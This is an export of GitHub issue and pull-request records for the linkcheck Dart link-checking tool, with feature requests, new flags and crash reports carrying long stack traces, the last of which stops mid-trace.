filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/60,748937221,MDExOlB1bGxSZXF1ZXN0NTI1ODQyMjc5,60,Add github action file,3065968,closed,FALSE,NA,NA,3,2020-11-23T16:16:21Z,2021-01-22T10:11:39Z,2021-01-22T06:47:17Z,CONTRIBUTOR,NA,"I think this is all you need to create a github action out of this.

As an alternative it would be possible to list all the arguments as github action arguments…
But doing it like this, it's easier to keep the action up to date and we keep the same interface which is already documented.

I created the action here: https://github.com/wunderundfitzig/linkcheck-action because I need to use it in a project.
I'm happy to hand over the repository if it would be better to keep the action in a seperate repo.
I would depricate that repo if a official action exists :-)

I guess this closes #46 ",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/60/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/60/comments,https://api.github.com/repos/filiph/linkcheck/issues/60/events,https://github.com/filiph/linkcheck/pull/60,https://api.github.com/repos/filiph/linkcheck/pulls/60
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/59,736459090,MDU6SXNzdWU3MzY0NTkwOTA=,59,"Use cli_pkg to release the binary to Homebrew, Chocolatey, etc",919717,open,FALSE,NA,NA,0,2020-11-04T22:15:45Z,2020-11-04T22:15:45Z,NA,OWNER,NA,"https://pub.dev/packages/cli_pkg

Announcement: https://groups.google.com/a/dartlang.org/g/misc/c/ef_qvZ91v8k/m/b4tZ8RMfAQAJ",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/59/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/59/comments,https://api.github.com/repos/filiph/linkcheck/issues/59/events,https://github.com/filiph/linkcheck/issues/59,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/58,723742391,MDU6SXNzdWU3MjM3NDIzOTE=,58,Servers often behave very differently than filesystems -- which and how?,837573,closed,FALSE,NA,NA,2,2020-10-17T12:03:12Z,2020-12-20T13:27:40Z,2020-10-18T02:52:17Z,NONE,NA,"In your README you state:

>Servers often behave very differently than file systems, so validating links on the file system often leads to both false positives and false negatives.

Surely linkchecker could make the same assumptions that static site generators already need to make to produce correct output? If that's not true, or if it would need to make more assumptions than that, could you elaborate on which changes in behavior you saw that make this impossible?",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/58/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/58/comments,https://api.github.com/repos/filiph/linkcheck/issues/58/events,https://github.com/filiph/linkcheck/issues/58,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/57,721728617,MDU6SXNzdWU3MjE3Mjg2MTc=,57,"Exception during running crawling ""NoSuchMethodError: The getter 'charset' was called on null.""",69821706,closed,FALSE,NA,NA,1,2020-10-14T19:40:23Z,2021-01-22T06:38:59Z,2021-01-22T06:38:59Z,NONE,NA,"Complete Error Message:

Crawling: 134Unhandled exception:
NoSuchMethodError: The getter 'charset' was called on null.
Receiver: null
Tried calling: charset
#0      checkPage (package:linkcheck/src/worker/worker.dart:149)
#1      _RootZone.runUnary (dart:async/zone.dart:1379)
#2      _FutureListener.handleValue (dart:async/future_impl.dart:137)
#3      Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#4      Future._propagateToListeners (dart:async/future_impl.dart:707)
#5      Future._completeWithValue (dart:async/future_impl.dart:522)
#6      _AsyncAwaitCompleter.complete (dart:async-patch/async_patch.dart:30)
#7      _completeOnAsyncReturn (dart:async-patch/async_patch.dart:288)
#8      _fetchHead (package:linkcheck/src/worker/worker.dart:0)
#9      _RootZone.runUnary (dart:async/zone.dart:1379)
#10     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#11     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#12     Future._propagateToListeners (dart:async/future_impl.dart:707)
#13     Future._completeWithValue (dart:async/future_impl.dart:522)
#14     Future.timeout.<anonymous closure> (dart:async/future_impl.dart:776)
#15     _RootZone.runUnary (dart:async/zone.dart:1379)
#16     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#17     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#18     Future._propagateToListeners (dart:async/future_impl.dart:707)
#19     Future._completeWithValue (dart:async/future_impl.dart:522)
#20     Future.wait.<anonymous closure> (dart:async/future.dart:400)
#21     _RootZone.runUnary (dart:async/zone.dart:1379)
#22     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#23     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#24     Future._propagateToListeners (dart:async/future_impl.dart:707)
#25     Future._completeWithValue (dart:async/future_impl.dart:522)
#26     Future._asyncComplete.<anonymous closure> (dart:async/future_impl.dart:552)
#27     _microtaskLoop (dart:async/schedule_microtask.dart:41)
#28     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50)
#29     _Timer._runTimers (dart:isolate-patch/timer_impl.dart:391)
#30     _Timer._handleMessage (dart:isolate-patch/timer_impl.dart:416)
#31     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:172)
135Unhandled exception:
NoSuchMethodError: The getter 'charset' was called on null.
Receiver: null
Tried calling: charset
#0      checkPage (package:linkcheck/src/worker/worker.dart:149)
#1      _RootZone.runUnary (dart:async/zone.dart:1379)
#2      _FutureListener.handleValue (dart:async/future_impl.dart:137)
#3      Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#4      Future._propagateToListeners (dart:async/future_impl.dart:707)
#5      Future._completeWithValue (dart:async/future_impl.dart:522)
#6      _AsyncAwaitCompleter.complete (dart:async-patch/async_patch.dart:30)
#7      _completeOnAsyncReturn (dart:async-patch/async_patch.dart:288)
#8      _fetchHead (package:linkcheck/src/worker/worker.dart:0)
#9      _RootZone.runUnary (dart:async/zone.dart:1379)
#10     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#11     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#12     Future._propagateToListeners (dart:async/future_impl.dart:707)
#13     Future._completeWithValue (dart:async/future_impl.dart:522)
#14     Future.timeout.<anonymous closure> (dart:async/future_impl.dart:776)
#15     _RootZone.runUnary (dart:async/zone.dart:1379)
#16     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#17     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#18     Future._propagateToListeners (dart:async/future_impl.dart:707)
#19     Future._completeWithValue (dart:async/future_impl.dart:522)
#20     Future.wait.<anonymous closure> (dart:async/future.dart:400)
#21     _RootZone.runUnary (dart:async/zone.dart:1379)
#22     _FutureListener.handleValue (dart:async/future_impl.dart:137)
#23     Future._propagateToListeners.handleValueCallback (dart:async/future_impl.dart:678)
#24     Future._propagateToListeners (dart:async/future_impl.dart:707)
#25     Future._completeWithValue (dart:async/future_impl.dart:522)
#26     Future._asyncComplete.<anonymous closure> (dart:async/future_impl.dart:552)
#27     _microtaskLoop (dart:async/schedule_microtask.dart:41)
#28     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50)
#29     _Timer._runTimers (dart:isolate-patch/timer_impl.dart:391)
#30     _Timer._handleMessage (dart:isolate-patch/timer_impl.dart:416)
#31     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:172)
Done crawling.",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/57/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/57/comments,https://api.github.com/repos/filiph/linkcheck/issues/57/events,https://github.com/filiph/linkcheck/issues/57,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/56,715979337,MDExOlB1bGxSZXF1ZXN0NDk4Nzk5NDg0,56,Introduce flag to turn off reporting of missing anchors,14848438,closed,FALSE,NA,NA,2,2020-10-06T19:53:57Z,2020-10-07T07:32:40Z,2020-10-06T23:49:56Z,CONTRIBUTOR,NA,"On some websites, fragment identifiers are used for dynamic content or otherwise handled by client-side code. On these sites, the absence of an anchor tag with the fragment id is not necessarily an error.

Currently, linkcheck always reports these cases as warnings. 
This PR introduces a --[no-]check-anchors flag to turn off reporting of missing anchors. By default it enables the reporting, but it offers users the option to turn these warnings off. ",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/56/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/56/comments,https://api.github.com/repos/filiph/linkcheck/issues/56/events,https://github.com/filiph/linkcheck/pull/56,https://api.github.com/repos/filiph/linkcheck/pulls/56
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/55,696100578,MDU6SXNzdWU2OTYxMDA1Nzg=,55,HTTP 308 Reported as Error,556932,closed,FALSE,NA,NA,7,2020-09-08T18:51:57Z,2020-10-01T17:31:42Z,2020-10-01T17:19:15Z,NONE,NA,"Hello again, and thank you again for this amazing tool! I discovered today that any [`308` status code](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) is characterized as an error by the link checker, where I think it probably shouldn't be.

I tried to fix this locally but wasn't able to get anything working 😢  - if someone was able to provide a little guidance I'd be happy to take a stab at a PR!",NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/55/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/55/comments,https://api.github.com/repos/filiph/linkcheck/issues/55/events,https://github.com/filiph/linkcheck/issues/55,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/54,684190162,MDExOlB1bGxSZXF1ZXN0NDcyMTI5MTY2,54,Add flag to show redirected links,14848438,closed,FALSE,NA,NA,1,2020-08-23T14:08:42Z,2020-09-01T20:50:05Z,2020-08-25T04:43:35Z,CONTRIBUTOR,NA,"In some cases it can be useful to list all links that don't directly point at their target, but instead contain a (chain of) redirect(s). This PR proposes the inclusion of a flag that does exactly that.

I'm not quite familiar with Dart or this project, so if there's anything I can do to improve this PR, please let me know!",NA,TRUE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/54/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/54/comments,https://api.github.com/repos/filiph/linkcheck/issues/54/events,https://github.com/filiph/linkcheck/pull/54,https://api.github.com/repos/filiph/linkcheck/pulls/54
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/53,619225858,MDU6SXNzdWU2MTkyMjU4NTg=,53,[Feature Request] - BasicAuth,5658838,open,FALSE,NA,NA,0,2020-05-15T20:24:14Z,2020-05-15T20:24:14Z,NA,NONE,NA,Adding BasicAuth via direkt Input(`https://user:passwort@fqdn`) or extra Header would be a nice option for secure environments.,NA,FALSE,https://api.github.com/repos/filiph/linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/53/labels{/name},https://api.github.com/repos/filiph/linkcheck/issues/53/comments,https://api.github.com/repos/filiph/linkcheck/issues/53/events,https://github.com/filiph/linkcheck/issues/53,NA
filiph,linkcheck,https://api.github.com/repos/filiph/linkcheck/issues/52,571241145,MDU6SXNzdWU1NzEyNDExNDU=,52,"FileSystemException: writeFrom failed, path = '' (OS Error: Broken pipe, errno = 32)",60045235,open,FALSE,NA,NA,1,2020-02-26T10:47:37Z,2021-01-22T06:38:00Z,NA,NONE,NA,"FileSystemException: writeFrom failed, path = '' (OS Error: Broken pipe, errno = 32)
#0      _RandomAccessFile.writeFromSync (dart:io/file_impl.dart:879)
#1      _StdConsumer.addStream.<anonymous closure> (dart:io/stdio.dart:344)
#2      _rootRunUnary (dart:async/zone.dart:1132)
#3      _CustomZone.runUnary (dart:async/zone.dart:1029)
#4      _CustomZone.runUnaryGuarded (dart:async/zone.dart:931)
#5      _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#6      _BufferingStreamSubscription._add (dart:async/stream_impl.dart:263)
#7      _SyncStreamControllerDispatch._sendData (dart:async/stream_controller.dart:764)
#8      _StreamController._add (dart:async/stream_controller.dart:640)
#9      _StreamController.add (dart:async/stream_controller.dart:586)
#10     _StreamSinkImpl.add (dart:io/io_sink.dart:156)
#11     _IOSinkImpl.write (dart:io/io_sink.dart:289)
#12     _IOSinkImpl.writeln (dart:io/io_sink.dart:309)
#13     _StdSink.writeln (dart:io/stdio.dart:341)
#14     crawl.print (package:linkcheck/src/crawl.dart:37)
#15     crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:133)
#16     _AsyncAwaitCompleter.start (dart:async-patch/async_patch.dart:43)
#17     crawl.<anonymous closure> (package:linkcheck/src/crawl.dart:123)
#18     _rootRunUnary (dart:async/zone.dart:1132)
#19     _CustomZone.runUnary (dart:async/zone.dart:1029)
#20     _CustomZone.runUnaryGuarded (dart:async/zone.dart:931)
#21     _BufferingStreamSubscription._sendData (dart:async/stream_impl.dart:336)
#22     _DelayedData.perform (dart:async/stream_impl.dart:591)
#23     _StreamImplEvents.handleNext (dart:async/stream_impl.dart:707)
#24     _PendingEvents.schedule.<anonymous closure> (dart:async/stream_impl.dart:667)
#25     _rootRun (dart:async/zone.dart:1120)
#26     _CustomZone.run (dart:async/zone.dart:1021)
#27     _CustomZone.runGuarded (dart:async/zone.dart:923)
#28     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963)
#29     _rootRun (dart:async/zone.dart:1124)
#30     _CustomZone.run (dart:async/zone.dart:1021)
#31     _CustomZone.runGuarded (dart:async/zone.dart:923)
#32     _CustomZone.bindCallbackGuarded.<anonymous closure> (dart:async/zone.dart:963)
#33     _microtaskLoop (dart:async/schedule_microtask.dart:41)
#34     _startMicrotaskLoop (dart:async/schedule_microtask.dart:50)
#35     _runPendingImmediateCallback (dart:isolate-patch/isolate_patch.dart:116)
#36     _RawReceivePortImpl._handleMessage (dart:isolate-patch/isolate_patch.dart:173)

Unhandled exception:
HttpException: Connection closed while receiving data, uri = https://hidden_website.com
#0      _HttpIncoming.listen.<anonymous closure> (dart:_http/http_impl.dart:161)
#1      _invokeErrorHandler (dart:async/async_error.dart:17)
#2      _HandleErrorStream._handleError (dart:async/stream_pipe.dart:286)
#3      _ForwardingStreamSubscription._handleError (dart:async/stream_pipe.dart:168)
#4      _RootZone.runBinaryGuarded (dart:async/zone.dart:1326)
#5      _BufferingStreamSubscription._sendError.sendError (dart:async/stream_impl.dart:355)
#6      _BufferingStreamSubscription._sendError (dart:async/stream_impl.dart:373)
#7      _BufferingStreamSubscription._addError (dart:async/stream_impl.dart:272)
#8      _SyncStreamControllerDispatch._sendError (dart:async/stream_controller.dart:768)
#9      _StreamController._addError (dart:async/stream_controller.dart:648)
#10     _StreamController.addError (dart:async/stream_controller.dart:600)
#11     _HttpParser._onDone (dart:_http/http_parser.dart:822)
#12     _RootZone.runGuarded (dart:async/zone.dart:1302)
#13     _BufferingStreamSubscription._sendDone.sendDone (dart:async/stream_impl.dart:389)
#14     _BufferingStreamSubscription._sendDone (dart:async/stream_impl.dart:399)
#15     _BufferingStreamSubscription._close (dart:async/stream_impl.dart:283)
#16     _SyncStreamControllerDispatch._sendDone (dart:async/stream_controller.dart:772)
#17     _StreamController._closeUnchecked (dart:async/stream_controller.dart:629)
#18     _StreamController.close (dart:async/stream_controller.dart:622)
#19     _Socket._onDone (dart:io-patch/socket_patch.dart:1844)
#20     _RootZone.runGuarded (dart:async/zone.dart:1302)
#21     _BufferingStreamSubscription._sendDone.sendDone (dart:async/stream_impl.dart:389)
#22     _BufferingStreamSubscription._sendDone (dart:async/stream_impl.dart:399)
#23     _BufferingStreamSubscription._close (dart:async/stream_impl.dart:283)
#24     _SyncStreamControllerDispatch._sendDone (dart:async/stream_controller.dart:772)
#25     _StreamController._closeUnchecked (dart:async/stream_controller.dart:629)
#26     _StreamController.close (dart:async/stream_controller.dart:622)
#27     _RawSecureSocket._close (dart:io/secure_socket.dart:648)
#28     _RawSecureSocket.shutdown (dart:io/secure_socket.dart:670)
#29     _RawSecureSocket.close (dart:io/secure_socket.dart:623)
#30     _Socket._closeRawSocket (dart:io-patch/socket_patch.dart:1800)
#31     _Socket.destroy (dart:io-patch/socket_patch.dart:1732)
#32     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1817)
#33     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#34     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#35     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#36     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#37     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#38     _ConnectionTarget.close (dart:_http/http_impl.dart:1955)
#39     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#40     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#41     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#42     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#43     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#44     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#45     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#46     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#47     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#48     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#49     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#50     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#51     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#52     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#53     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#54     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#55     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#56     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#57     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#58     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#59     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#60     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#61     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#62     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#63     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#64     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#65     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#66     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#67     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#68     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#69     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#70     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#71     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#72     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#73     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#74     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#75     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#76     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#77     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#78     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#79     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#80     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#81     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#82     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#83     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#84     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#85     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#86     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#87     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#88     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#89     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#90     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#91     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#92     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#93     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#94     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#95     _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#96     _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#97     _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#98     _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#99     _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#100    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#101    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#102    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#103    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#104    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#105    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#106    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#107    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#108    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#109    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#110    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#111    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#112    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#113    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#114    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#115    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#116    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#117    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#118    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#119    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#120    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#121    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#122    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#123    _ConnectionTarget.close (dart:_http/http_impl.dart:1955)
#124    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#125    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#126    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#127    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#128    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#129    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#130    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#131    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#132    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#133    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#134    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#135    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#136    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#137    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#138    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#139    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#140    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#141    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#142    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#143    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#144    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#145    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#146    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#147    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#148    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#149    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#150    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#151    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#152    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#153    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#154    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#155    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#156    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#157    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#158    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#159    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#160    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#161    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#162    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#163    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#164    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#165    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#166    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#167    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#168    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#169    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#170    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#171    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#172    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#173    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#174    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#175    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#176    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#177    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#178    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#179    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#180    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#181    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#182    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#183    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#184    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#185    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#186    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#187    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#188    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#189    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#190    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#191    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#192    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#193    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#194    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#195    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#196    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#197    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#198    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#199    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#200    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#201    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#202    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#203    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#204    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#205    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#206    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#207    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#208    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#209    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#210    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#211    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#212    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#213    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#214    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#215    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#216    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#217    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#218    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#219    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#220    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#221    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#222    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#223    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#224    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
#225    _HttpClient._connectionsChanged (dart:_http/http_impl.dart:2275)
#226    _HttpClient._connectionClosed (dart:_http/http_impl.dart:2269)
#227    _HttpClientConnection.destroy (dart:_http/http_impl.dart:1816)
#228    _ConnectionTarget.close (dart:_http/http_impl.dart:1958)
#229    _HttpClient._closeConnections (dart:_http/http_impl.dart:2281)
